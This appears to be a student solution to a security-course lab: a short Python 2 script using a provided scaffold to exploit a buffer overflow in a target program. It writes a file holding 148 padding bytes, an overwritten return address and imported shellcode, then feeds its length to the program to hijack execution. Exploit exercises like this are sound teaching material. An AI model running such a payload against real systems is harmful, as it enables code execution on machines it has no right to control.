#!/usr/bin/env python2

import scaffold as p
from scaffold import SHELLCODE

### YOUR CODE STARTS HERE ###


f = open("hack", "w")
f.write("Hello world!\n")
f.flush()
f.close()

p.start()

assert p.recv(30) == 'How many bytes should I read? '

bufferOverflow = "A" * 148
#garbage = 'A' * 8
rip = "\xc0\xfc\xff\xbf"
haccyboi =  bufferOverflow + rip + SHELLCODE + '\x00' 
f = open("hack","w")
#f.write(large)
#f.write(rip)
#f.write('A'*4)
#f.write(SHELLCODE)
f.write(haccyboi)
f.flush()
f.close()

ln = len(haccyboi)
print(ln)
p.send(str(ln)+"\n")

#assert p.recv(18) == 'Here is the file!\n'
print p.recv(300)
### YOUR CODE ENDS HERE ###
